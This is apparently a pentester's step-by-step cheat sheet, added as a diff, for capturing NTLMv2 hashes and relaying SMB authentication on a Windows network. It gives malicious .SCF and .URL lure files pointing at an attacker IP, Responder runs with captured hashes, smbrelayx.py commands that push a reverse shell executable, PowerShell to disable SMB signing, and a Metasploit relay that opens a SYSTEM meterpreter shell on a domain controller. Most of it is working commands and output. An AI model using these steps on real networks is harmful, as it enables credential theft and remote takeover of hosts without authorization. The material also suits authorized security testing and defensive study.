@@ -1,0 +1,428 @@
+==================================================================================================================
+Domain Privesc - SMB Relay attacks using SCF & URL files 
+==================================================================================================================
+
+During an internal penetration test if you discover a file share over the network with write permissions for your account or for 
+unauthenticated users then you can create a .SCF file (Shell Command File) with a link to a malicious UNC path (e.g. your Kali) and
+or a .URL file with a link to a malicious URL which will allow you to:
+- capture the NTLMv2 password hash (using the tool Responder) of the users who browsed the network file share;
+- perform a SMB relay attack (using for example the tool SMBrelayx.py or Metasploit) to attempt to run commands on a remote server
+  with the privileges of the users who browsed the network file share.
+
+Notes: 
+- SMB relay attacks can also be used in conjunction with LLMNR/NBT-NS Poisoning.
+- SMB relay attacks won't work if SMB signing is enabled (which is the case by default in recent versions of Windows OS).
+
+
+==================================================================================================================
+Step 1. Identify a file share over the network with write permissions 
+==================================================================================================================
+
+Many techniques and tools can be used to identify Windows file shares with write permissions over a network 
+(e.g. native Windows commands, PowerView powershell scripts, nmap, crackmapexec, ...)
+
+
+==================================================================================================================
+Step 2. Write a malicious .URL file and/or a malicious .SCF file on the file share
+==================================================================================================================
+
+$ cat MaliciousURLfile.url
+[InternetShortcut]
+URL=http://192.168.1.45
+WorkingDirectory=securityaudit
+IconFile=\\192.168.1.45\share\auditor.ico
+IconIndex=1
+
+$ cat MaliciousSCFfile.scf
+[Shell]
+Command=2
+IconFile=\\192.168.1.45\share\auditor.ico
+[Taskbar]
+Command=ToggleDesktop
+
+
+NOTE: IP of my KALI '192.168.1.45'.
+
+
+==================================================================================================================
+Step 3. Start RESPONDER and wait for a user to browse the file share hosting the malicious SCF & URL files
+==================================================================================================================
+
+When a user browses the file share (i.e. shared folder hosting the malicious SCF & URL files) we can capture his NTLMv2 password hash
+with the tool Responder.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo responder -I eth0 -wrf -v                                                                                                                                                                                        1 ⨯
+[sudo] password for kali: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    DNS/MDNS                   [ON]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [ON]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Fingerprint hosts          [ON]
+
+[+] Generic Options:
+    Responder NIC              [eth0]
+    Responder IP               [192.168.1.45]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-QXYVQN65085]
+    Responder Domain Name      [ZRAC.LOCAL]
+    Responder DCE-RPC Port     [48484]
+
+[+] Listening for events...   
+
+[SMB] NTLMv2-SSP Client   : 192.168.1.50
+[SMB] NTLMv2-SSP Username : SECURITY-LAB\Qualys
+[SMB] NTLMv2-SSP Hash     : Qualys::SECURITY-LAB:77bb79b34bc417af:A19E4BC442C04FF433D01187B92D83D8:01010000000000000037086DC9D8D701
+12B7C37A18D84C730000000002000800540058005800390001001E00570049004E002D00490056004D0033005000480042004B004E0035003700040034005700490
+04E002D00490056004D0033005000480042004B004E00350037002E0054005800580039002E004C004F00430041004C000300140054005800580039002E004C004F
+00430041004C000500140054005800580039002E004C004F00430041004C00070008000037086DC9D8D701060004000200000008003000300000000000000001000
+0000020000050E620807DEDCC26AC4316133599D4F8CD1AB51560759C5EEDDF83E6A9D8A0D70A001000000000000000000000000000000000000900220063006900
+660073002F003100390032002E003100360038002E0031002E0034003500000000000000000000000000
+<SNIP>
+
+[SMB] NTLMv2-SSP Client   : 192.168.1.41
+[SMB] NTLMv2-SSP Username : DESKTOP-Test\jeff
+[SMB] NTLMv2-SSP Hash     : jeff::DESKTOP-Test:19959dc4540bb4ad:8B153DC4CFED888E6EAED99D68AE22BD:0101000000000000005BDB35B4D8D70151
+F7DDB956B2393D00000000020008004D0047005200520001001E00570049004E002D0048004E0055004A00330048004200470033004400300004003400570049004
+E002D0048004E0055004A0033004800420047003300440030002E004D004700520052002E004C004F00430041004C00030014004D004700520052002E004C004F00
+430041004C00050014004D004700520052002E004C004F00430041004C0007000800005BDB35B4D8D70106000400020000000800300030000000000000000100000
+000200000B3B6EB0454C12BAA64BCAF05599706918B2BA128BC95F816858BAD675BA668180A00100000000000000000000000000000000000090022006300690066
+0073002F003100390032002E003100360038002E0031002E00340035000000000000000000      
+<SNIP>
+
+[*] [LLMNR]  Poisoned answer sent to 192.168.1.41 for name securityaudit
+[HTTP] Sending NTLM authentication request to 192.168.1.41
+[HTTP] GET request from: 192.168.1.41     URL: / 
+[HTTP] Host             : securityaudit 
+[HTTP] NTLMv2 Client   : 192.168.1.41
+[HTTP] NTLMv2 Username : DESKTOP-Test\auditor
+[HTTP] NTLMv2 Hash     : auditor::DESKTOP-Test:f6aa1e5339198c95:A9A9DD48AB58878ED0EEE8D3B531B482:0101000000000000CF382B861FD9D701DF
+5E6611AE67FE8C00000000020008005A0052004100430001001E00570049004E002D00510058005900560051004E0036003500300038003500040014005A0052004
+10043002E004C004F00430041004C0003003400570049004E002D00510058005900560051004E00360035003000380035002E005A005200410043002E004C004F00
+430041004C00050014005A005200410043002E004C004F00430041004C000800300030000000000000000000000000200000B3B6EB0454C12BAA64BCAF055997069
+18B2BA128BC95F816858BAD675BA668180A001000000000000000000000000000000000000900240048005400540050002F00730065006300750072006900740079
+00610075006400690074000000000000000000                                                                                                                                                                                                                                  
+<SNIP>
+
+
+------------------------------------------------------------------
+Other example - Responder started with the --LM option
+------------------------------------------------------------------
+
+┌──(kali㉿kali)-[~]
+└─$ sudo responder -I eth0 -wrf --lm -v                                                                                                                                                                                        1 ⨯
+[sudo] password for kali: 
+__
+                                        __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    DNS/MDNS                   [ON]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [ON]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [ON]
+    Fingerprint hosts          [ON]
+
+[+] Generic Options:
+    Responder NIC              [eth0]
+    Responder IP               [192.168.1.45]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-QXYVQN65085]
+    Responder Domain Name      [ZRAC.LOCAL]
+    Responder DCE-RPC Port     [48484]
+
+[+] Listening for events...                                                                                                                                                                                                        
+<SNIP>
+[*] [NBT-NS] Poisoned answer sent to 192.168.1.41 for name RESPPROXYSRV (service: File Server)
+[*] [MDNS] Poisoned answer sent to 192.168.1.41    for name respproxysrv.local
+[!]  Fingerprint failed
+
+[*] [LLMNR]  Poisoned answer sent to 192.168.1.41 for name respproxysrv
+[SMB] NTLMv2 Client   : 192.168.1.41
+[SMB] NTLMv2 Username : DESKTOP-Test\auditor
+[SMB] NTLMv2 Hash     : auditor::DESKTOP-Test:e68669d4888f79a1:DAF65F1FC6676FDFB2BC6FC16DA62174:0101000000000000467B047B1FD9D70142
+3FABB8FD52A27600000000020000000000000000000000
+<SNIP>
+[SMB] NTLMv2 Client   : 192.168.1.41
+[SMB] NTLMv2 Username : DESKTOP-Test\jeff
+[SMB] NTLMv2 Hash     : jeff::DESKTOP-Test:19fdee379a9db327:FBE6ECB027C4942125BF629B09D1D5C4:010100000000000085EB6D3120D9D7017BB5D
+7CC4A77F5B400000000020000000000000000000000
+<SNIP>
+
+
+========================================================================================================================================
+Step 4. Perform a SMB relay attack when a user (with a privileged account) browses the file share hosting the malicious SCF & URL files
+========================================================================================================================================
+
+-----------------------------------------------------------------------------
+Option 1. Use SMBrelayx.py (Impacket python framework)
+-----------------------------------------------------------------------------
+
+Commands:
+---------
+> sudo python3 ./smbrelayx.py -h 192.168.1.50 -e ./obfuscated-payload.exe
+> sudo python3 ./smbrelayx.py -h 192.168.1.50 -c  <windows command>
+
+Examples:
+---------
+
+(kali@kali)-[/usr/share/doc/python3-impacket/examples] $ sudo python3 ./smbrelayx.py -h 192.168.1.50 -e ./reverseshell.exe
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Running in relay mode
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+
+[*] Servers started, waiting for connections
+[*] HTTPD: Received connection from 192.168.1.41, attacking target 192.168.1.50
+[*] HTTPD: Received connection from 192.168.1.41, attacking target 192.168.1.50
+[*] SMBD: Received connection from 192.168.1.41, attacking target 192.168.1.50
+
+[-] Signature is REQUIRED on the other end, attack will not work
+[-] Authenticating against 192.168.1.50 as SECURITY-LAB\Qualys FAILED
+
+[*] Quitting.. please wait
+
+
+NOTES:
+> SMB signing is enabled by default on my local pentest lab. After disabling SMB signing, the attack is working.
+> PowerShell commands to disable SMB signing on a DC:
+  - Set-SmbServerConfiguration -EnableSecuritySignature $false
+  - Set-SmbServerConfiguration -RequireSecuritySignature $false
+
+
+(kali@kali)--[/usr/share/doc/python3-impacket/examples] $ sudo python3 ./smbrelayx.py -h 192.168.1.50 -c ipconfig
+[sudo] password for kali: 
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Running in relay mode
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+
+[*] Servers started, waiting for connections
+
+[*] HTTPD: Received connection from 192.168.1.41, attacking target 192.168.1.50
+[*] SMBD: Received connection from 192.168.1.41, attacking target 192.168.1.50
+[-] Authenticating against 192.168.1.50 as DESKTOP-Test\jeff FAILED
+
+[*] HTTPD: Received connection from 192.168.1.41, attacking target 192.168.1.50
+[*] Authenticating against 192.168.1.50 as security-lab\qualys SUCCEED
+[*] qualys::security-lab:ceec2333ec7040dd:0be1615d6140122a42568548482af2a3:01010000000000007dd47aaaffd8d701af0335005c4ad94c0000000
+002001800530045004300550052004900540059002d004c004100420001000e00540045004d0050002d004400430004002e0053006500630075007200690074007
+9002d0054006500730074002d004c00610062002e004c006f00630061006c0003003e00540045004d0050002d00440043002e00530065006300750072006900740
+079002d0054006500730074002d004c00610062002e004c006f00630061006c0005002e00530065006300750072006900740079002d0054006500730074002d004
+c00610062002e004c006f00630061006c00070008007dd47aaaffd8d70106000400020000000800300030000000000000000100000000200000be9c3a3714c185f
+503e640424218992433a43b51f17538f8484f29e0537b60760a001000000000000000000000000000000000000900220048005400540050002f003100390032002
+e003100360038002e0031002e00340035000000000000000000
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Executed specified command on host: 192.168.1.50
+
+Windows IP Configuration
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : 2a01:e34:ec6f:d7e0:55d7:c826:4294:b8ed
+   Link-local IPv6 Address . . . . . : fe80::55d7:c826:4294:b8ed%12
+   IPv4 Address. . . . . . . . . . . : 192.168.1.50
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::6aa3:78ff:fe8b:cdd%12
+                                       192.168.1.254
+
+Tunnel adapter isatap.{90148F03-D3ED-497A-A8AA-707E40A59758}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+[*] Stopping service RemoteRegistry
+<SNIP>
+
+
+-----------------------------------------------------------------------------
+Option 2. Use the Metasploit plugin "smb_relay"
+-----------------------------------------------------------------------------
+
+msf6 exploit(windows/smb/smb_relay) > options
+
+Module options (exploit/windows/smb/smb_relay):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SHARE    ADMIN$           yes       The share to connect to
+   SMBHOST  192.168.1.50     no        The target SMB server (leave empty for originating system)
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine
+                                       or 0.0.0.0 to listen on all addresses.
+   SRVPORT  445              yes       The local port to listen on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.45     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+msf6 exploit(windows/smb/smb_relay) > exploit
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.1.45:4444 
+[*] Started service listener on 0.0.0.0:445 
+[*] Server started.
+msf6 exploit(windows/smb/smb_relay) > 
+
+[*] Sending NTLMSSP NEGOTIATE to 192.168.1.50
+[*] Extracting NTLMSSP CHALLENGE from 192.168.1.50
+[*] Forwarding the NTLMSSP CHALLENGE to 192.168.1.41:49963
+[*] Extracting the NTLMSSP AUTH resolution from 192.168.1.41:49963, and sending Logon Failure response
+[*] Forwarding the NTLMSSP AUTH resolution to 192.168.1.50
+[*] Error processing request from 192.168.1.41:49963 (115): Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: 
+STATUS_LOGON_FAILURE (Command=115 WordCount=0) ["/usr/share/metasploit-framework/modules/exploits/windows/smb/smb_relay.rb:753:
+in `smb_cmd_ntlmssp_auth'", "/usr/share/metasploit-framework/modules/exploits/windows/smb/smb_relay.rb:662:<SNIP>
+
+[*] Sending NTLMSSP NEGOTIATE to 192.168.1.50
+[*] Extracting NTLMSSP CHALLENGE from 192.168.1.50
+[*] Forwarding the NTLMSSP CHALLENGE to 192.168.1.41:49967
+[*] Extracting the NTLMSSP AUTH resolution from 192.168.1.41:49967, and sending Logon Failure response
+[*] Forwarding the NTLMSSP AUTH resolution to 192.168.1.50
+[+] SMB auth relay against 192.168.1.50 succeeded
+[*] Connecting to the defined share...
+[*] Regenerating the payload...
+[*] Uploading payload...
+[*] Created \UkrenJpn.exe...
+[*] Connecting to the Service Control Manager...
+[*] Obtaining a service manager handle...
+[*] Creating a new service...
+[*] Closing service handle...
+[*] Opening service...
+[*] Starting the service...
+[*] Removing the service...
+[*] Closing service handle...
+[*] Deleting \UkrenJpn.exe...
+[*] Sending stage (175174 bytes) to 192.168.1.50
+[*] Meterpreter session 1 opened (192.168.1.45:4444 -> 192.168.1.50:49375) at 2021-11-13 21:46:11 -0500
+
+msf6 exploit(windows/smb/smb_relay) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                    Connection
+  --  ----  ----                     -----------                    ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ TEMP-DC  192.168.1.45:4444 -> 192.168.1.50:49375 (192.168.1.50)
+
+msf6 exploit(windows/smb/smb_relay) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > shell
+Process 1656 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>hostnq;e
+hostnq;e
+'hostnq' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\system32>hostname
+hostname
+TEMP-DC
+
+<SNIP>
